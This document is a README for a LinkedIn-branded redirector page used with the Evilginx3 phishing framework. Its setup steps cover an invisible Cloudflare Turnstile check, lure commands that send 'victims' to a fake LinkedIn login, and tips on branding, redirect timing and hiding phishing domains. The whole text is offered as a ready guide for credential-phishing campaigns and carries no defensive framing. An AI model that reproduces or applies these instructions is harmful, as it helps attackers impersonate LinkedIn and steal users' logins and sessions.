# LinkedIn Turnstile Redirector

## Overview

This redirector provides a professional security verification page for LinkedIn phishing campaigns using Cloudflare Turnstile CAPTCHA.

## Setup Instructions

### 1. Create Cloudflare Turnstile Site

1. Go to your Cloudflare dashboard: https://dash.cloudflare.com/?to=/:account/turnstile
2. Click "Add Site"
3. Configure the site:
   - **Site name**: LinkedIn Redirector (or any name you prefer)
   - **Domain**: Your phishing domain (e.g., `login.your-domain.com`)
   - **Widget Mode**: Select **Invisible** for seamless UX
4. Click "Create"
5. Copy the **Site Key** provided

### 2. Update the Redirector

1. Open `index.html` in this directory
2. Find line 256: `const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ';`
3. Replace `0x4AAAAAAB_V5zjG-p6Hl2ZQ` with your actual Turnstile Site Key
4. Save the file

### 3. Configure Evilginx3

1. Create a lure for your LinkedIn phishlet:
   ```
   lures create linkedin
   lures edit 0 redirector linkedin_turnstile
   lures edit 0 path /secure
   ```

2. Get the lure URL:
   ```
   lures get-url 0
   ```

3. Use this URL in your phishing campaign

## How It Works

1. Victim clicks the lure URL (e.g., `https://your-domain.com/secure`)
2. Redirector page loads with LinkedIn branding and security message
3. Cloudflare Turnstile verification runs invisibly in the background
4. After 3 seconds (or successful verification), victim is redirected to `/` (LinkedIn login page)
5. Victim sees the actual LinkedIn phishing page and proceeds to log in

## Features

- **Professional Design**: Matches LinkedIn's brand colors (#0A66C2) and styling
- **Invisible CAPTCHA**: Turnstile runs without user interaction
- **Automatic Fallback**: Redirects after 3 seconds even if Turnstile fails
- **Mobile Responsive**: Works on all device sizes
- **Error Handling**: Gracefully handles Turnstile failures

## Customization

You can customize the redirector by modifying `index.html`:

- **Security Message**: Edit the text in the `.subtitle` and `.security-info` sections
- **Branding**: Modify colors, fonts, and the LinkedIn logo SVG
- **Redirect Delay**: Change the timeout value in the JavaScript (default: 3000ms)

## Troubleshooting

### Turnstile Not Working

- Verify your Site Key is correct
- Ensure your domain matches the one configured in Cloudflare
- Check browser console for errors

### Redirect Loop

- Make sure the lure `path` is different from the landing page path
- Landing page should be at `/`, lure at `/secure` or similar

### CAPTCHA Visible

- Ensure Widget Mode is set to "Invisible" in Cloudflare dashboard
- The widget div has `display: none` in CSS for invisible mode

## Security Notes

- Replace the placeholder Site Key before deploying
- Use HTTPS for all phishing domains
- Monitor Turnstile analytics in Cloudflare dashboard
- Consider IP-based filtering for additional security

## Support

For Evilginx3 issues, refer to the main documentation.
For Turnstile setup help, visit: https://developers.cloudflare.com/turnstile/

